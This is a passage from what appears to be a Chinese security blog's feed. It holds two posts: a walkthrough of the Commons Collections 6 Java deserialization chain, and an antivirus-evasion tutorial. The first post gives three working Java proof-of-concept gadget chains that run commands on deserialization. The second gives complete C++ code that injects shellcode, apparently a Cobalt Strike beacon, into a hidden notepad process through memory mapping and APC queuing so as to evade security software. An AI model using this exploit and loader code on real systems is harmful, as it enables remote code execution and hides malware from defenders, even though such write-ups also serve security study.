class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() </span><br><span class="hljs-comment">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment"> java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment"> java.lang.Runtime.exec()</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h1 id="3-利用链分析"><a href="#3-利用链分析" class="headerlink" title="3.利用链分析"></a>3.利用链分析</h1><p>我们在上面说过解决高版本问题的方法是在上下文中找到其它利用<code>LazyMap#get()</code>的地方。</p><p>​    我们找到的类就是<code>org.apache.commons.collections.keyvalue.TiedMapEntry </code>，在它的<code>getValue</code>方法中调用了<code>this.map.get</code>，而其<code>hashCode</code>方法调用了<code>getValue</code>。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1.png"></p><p>​    因此，如果我们想要触发<code>LazyMap</code>利用链，就要找到哪里调用了</p><p><code>TiedMapEntry#hashCode</code>。</p><p>​    我们来看看<code>YSO</code>的作者的利用链比P牛的利用链多了两个步骤。在<code>ysoserial</code>中，是利⽤ <code>java.util.HashSet#readObject </code>到 <code>HashMap#put() </code>到 <code>HashMap#hash(key)</code>最后到 <code>TiedMapEntry#hashCode() </code>。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/2.png"></p><p>​    而P牛发现，在 <code>java.util.HashMap#readObject </code>中就可以找到<code>HashMap#hash()</code>的调⽤，去掉了最前⾯的两次调⽤：</p><p>​    在<code>java.util.HashMap#readObject</code>可以发现调用了<code>hash()</code>方法。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/3.png"></p><p>​    同时在<code>java.util.HashMap#hash()</code>发现了<code>key.hashCode</code>，只要我们让<code>key</code>为<code>TiedMapEntry</code>对象即可。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/4.png"></p><h1 id="4-构造代码"><a href="#4-构造代码" class="headerlink" title="4.构造代码"></a>4.构造代码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/6.png"></p><p>执行代码，弹了一个计算器，你以为成功，但是其实没有。。。</p><p>该计算器是在执行<code>put</code>方法的时候，触发的。并不是在反序列化的时候触发的。</p><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/5.png"></p><p>P牛对此的解决方法是<code>outerMap.remove(&quot;keykey&quot;);</code></p><p>成功在反序列化的时候也触发了命令执行。：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc6</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;deepin-calculator&quot;</span>&#125;),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object o = (Object)ois.readObject();<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/7.png"></p><p>我们要想解决在调用<code>put</code>方法的时候就触发命令执行的问题，可以用如下<code>POC</code>：</p><p>构造<code>LazyMap</code>的时候先⽤了⼀个⼈畜⽆害的<code> fakeTransformers</code> 对象，等最后要⽣成<code>Payload</code>的时候，再利用反射将真正的<code>transformers</code>替换进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc6OfPgod</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException </span>&#123;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<span class="hljs-keyword">new</span><br>            ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                String.class,<br>                Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                Object.class,<br>                Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123; <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span><br>                Object[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123; String.class<br>            &#125;,<br>                <span class="hljs-keyword">new</span> String[] &#123; <span class="hljs-string">&quot;deepin-calculator&quot;</span> &#125;),<br>            <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>),<br>        &#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(fakeTransformers);<br>        Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innerMap, transformerChain);<br>        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        Map expMap = <span class="hljs-keyword">new</span> HashMap();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;keykey&quot;</span>);<br>        Field f =<br>            ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-keyword">true</span>);<br>        f.set(transformerChain, transformers);<br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        ByteArrayOutputStream barr = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(barr.toByteArray()));<br>        Object object = (Object) ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/8.png"></p><h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h1><p>P牛代码审计星球的《Java安全漫谈 - 12.反序列化篇(6)》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    本篇文章我并不打算直接按照&lt;code&gt;ysoserial&lt;/code&gt;中的代码进⾏讲解，原因是&lt;code&gt;ysos</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀-内存注入之MappingInjection</title>
    <link href="https://reader-l.github.io/2021/04/25/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BMappingInjection/"/>
    <id>https://reader-l.github.io/2021/04/25/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BMappingInjection/</id>
    <published>2021-04-25T11:26:00.000Z</published>
    <updated>2021-04-26T03:03:54.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在一些杀软中，像<code>VirtualAlloc</code>、<code>WriteProcessMemory</code>等一些经典注入的API是重点监控关注对象，而使用内存对象映射相关函数可以避免这种情况，同时当进程内的一个线程调用一个会创建内核对象的函数时，内核将为这个对象分配并且初始化一个内存块，因此在本次实验中创建Mapping内核对象本质上属于申请一块物理内存。同时申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里。</p><h1 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h1><p>​    1.使用分离技术，将<code>shellcode</code>和加载器分离。使用内存映射读<code>shellcode</code>。</p><p>​    2.创建应用程序进程，比如<code>notepad.exe</code>。</p><p>​    3.在该进程中创建<code>Mapping</code>。</p><p>​    4.将mapping映射到注入进程虚拟地址。</p><p>​    5.往被映射的虚拟地址写入<code>shellcode</code>。</p><p>​    6.打开被注入进程句柄。</p><p>​    7.将mapping映射到被注入进程虚拟地址。</p><p>​    8.创建远程线程。</p><h1 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3.代码实现"></a>3.代码实现</h1><p>如下代码只实现核心部分，加密混淆部分我就去除掉了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib, <span class="hljs-meta-string">&quot;OneCore.lib&quot;</span>)</span><br><span class="hljs-comment">//MapViewOfFile2函数依赖这个静态链接库</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span></span>;<br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[])<br>&#123;<br><span class="hljs-keyword">if</span> (Help(argc) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">//获取shellcode</span><br>DWORD dwread = <span class="hljs-number">0</span>;<br>HANDLE  hFile = CreateFile(argv[<span class="hljs-number">1</span>], GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID shellcode_Hmap = CreateFileMapping(hFile, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-number">0</span>, shellcode_size,<span class="hljs-literal">NULL</span>);<br>LPVOID shellcode = MapViewOfFile(shellcode_Hmap, FILE_MAP_WRITE | FILE_MAP_READ, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, shellcode_size);<br><br><span class="hljs-comment">// Create a 64-bit process: </span><br>STARTUPINFOA si;<br>PROCESS_INFORMATION pi;<br>HANDLE hProcess, hThread;<br>ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br><br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><br><br>CreateProcessA(<span class="hljs-string">&quot;C:\\windows\\system32\\notepad.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br><span class="hljs-comment">//利用内存映射往内存注入shellcode</span><br>HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-number">0</span>, shellcode_size, <span class="hljs-literal">NULL</span>);<br>LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, shellcode_size);<br><span class="hljs-built_in">memcpy</span>((PVOID)lpMapAddress, shellcode, shellcode_size);<br><br>LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, pi.hProcess, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, PAGE_EXECUTE_READ);<br><span class="hljs-comment">//利用APC函数执行线程，避开CreateRemoteThread</span><br>QueueUserAPC((PAPCFUNC)lpMapAddressRemote, pi.hThread, <span class="hljs-literal">NULL</span>);<br>ResumeThread(pi.hThread);<br>    <span class="hljs-comment">//释放句柄</span><br>CloseHandle(pi.hThread);<br>CloseHandle(hMapping);<br>    <span class="hljs-comment">//从调用进程的地址空间取消映射文件的映射视图。</span><br>UnmapViewOfFile(lpMapAddress);<br>UnmapViewOfFile(shellcode);<br>UnmapViewOfFile(lpMapAddressRemote);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">Help</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Powered by reader-l\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Blog:http://reader-l.github.io\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage:MappingInjection.exe beacon.bin\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-完整程序"><a href="#4-完整程序" class="headerlink" title="4.完整程序"></a>4.完整程序</h1><p><a href="https://github.com/ReadER-L/BypassSecuritySoftware">https://github.com/ReadER-L/BypassSecuritySoftware</a></p><h1 id="5-配合加密混淆效果"><a href="#5-配合加密混淆效果" class="headerlink" title="5.配合加密混淆效果"></a>5.配合加密混淆效果</h1><p>还不错</p><p><img src="/2021/04/25/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BMappingInjection/1.png"></p><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6.参考链接"></a>6.参考链接</h1><p><a href="https://blog.csdn.net/Kwansy/article/details/114062311">https://blog.csdn.net/Kwansy/article/details/114062311</a></p><p><a href="https://docs.microsoft.com/en-us/search/?terms=MapViewOfFile2&amp;category=Reference&amp;scope=Desktop">https://docs.microsoft.com/en-us/search/?terms=MapViewOfFile2&amp;category=Reference&amp;scope=Desktop</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在一些杀软中，像&lt;code&gt;VirtualAlloc&lt;/code&gt;、&lt;code&gt;WriteProcessMemor</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Java安全-FastJson之JdbcRowSetImpl链分析</title>
    <link href="https://reader-l.github.io/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-04-24T02:19:58.000Z</published>
    <updated>2021-04-24T12:04:26.468Z</updated>
    
